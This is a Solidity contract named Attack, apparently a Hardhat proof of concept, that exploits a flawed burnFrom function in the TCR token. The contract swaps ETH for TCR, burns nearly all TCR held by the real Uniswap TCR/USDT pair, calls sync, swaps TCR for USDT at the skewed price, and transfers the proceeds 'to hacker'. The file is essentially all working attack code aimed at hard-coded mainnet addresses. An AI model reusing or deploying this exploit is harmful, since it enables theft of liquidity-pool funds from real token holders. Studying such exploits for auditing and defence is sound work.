// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "hardhat/console.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "./Uniswap/Interfaces/IUniswapV2Router02.sol";
//
//import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
//TcrToken
import "./TcrToken.sol";


contract Attack {
    address payable public owner;
    address USDTAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address TCRAddr = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;
    address RouterAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address PairAddr = 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4;
    address WETHAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    address public stakedToken;

//    constructor(address _stakedToken,address _trusty_address) payable {
//        require(_stakedToken != address(0) , "STAKING: Zero address detected");
//        owner = payable(msg.sender);
//        stakedToken = _stakedToken;
//        _setupRole(TRUSTY_ROLE, _trusty_address);
//    }

    constructor() payable {
        owner = payable(msg.sender);
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "onlyOnner is allow");
        _;
    }

    function kill(address addr) public onlyOwner {
        selfdestruct(payable(addr));
    }


    function startAttack() public onlyOwner{
        IERC20 USDT = IERC20(address(0xdAC17F958D2ee523a2206206994597C13D831ec7));
        TcrToken TCR = TcrToken(TCRAddr);



        // 进行授权 function returned an unexpected amount of data
//        USDT.approve(RouterAddr, MAX_INT);
        TCR.approve(RouterAddr, MAX_INT);
        TCR.approve(PairAddr, MAX_INT);

        IUniswapV2Pair pair = IUniswapV2Pair(PairAddr);

        // 将Attack合约中所有的ETH兑换成tcrToken
        uint256 wethAmount = address(this).balance;
        IUniswapV2Router02 router = IUniswapV2Router02(RouterAddr);
        uint256 amountOutMin;
        address[] memory path = new address[](3);
        path[0] = WETHAddr;
        path[1] = USDTAddr;
        path[2] = TCRAddr;
        uint256 deadline = block.timestamp + 24 hours;
        router.swapExactETHForTokens{value: wethAmount}(amountOutMin, path, address(this), deadline);
        console.log("1.swap eth to tcrToken. %s ETH swap to %s tcrToken.", wethAmount, TCR.balanceOf(address(this)));


        // 计算Pair合约中tcrToken的余额,用来评估可以销毁掉多少tcrToken
        uint256 pairTcrBalance =  TCR.balanceOf(PairAddr);
        console.log("At begining, Pair Contract has %s tcrToken:", pairTcrBalance);
        console.log("2. Call the Vulnerable burnFrom function.");
        TCR.burnFrom(PairAddr, pairTcrBalance-100000000);
        pair.sync();


        console.log("3. Swap tcr for USDT.");
        uint256 thisTcrBalance = TCR.balanceOf(address(this));
        uint256 amountOut;
        address[] memory path2 = new address[](2);
        path2[0] = TCRAddr;
        path2[1] = USDTAddr;
        router.swapExactTokensForTokens(thisTcrBalance, amountOut, path2, address(this), deadline);
        uint256 lastUsdt = USDT.balanceOf(address(this));
        console.log("%s tcr swap to %s USDT", thisTcrBalance, lastUsdt);
        console.log("4. Transfer %s USDT to hacker.", lastUsdt);
        USDT.transfer(msg.sender, lastUsdt);
    }
}
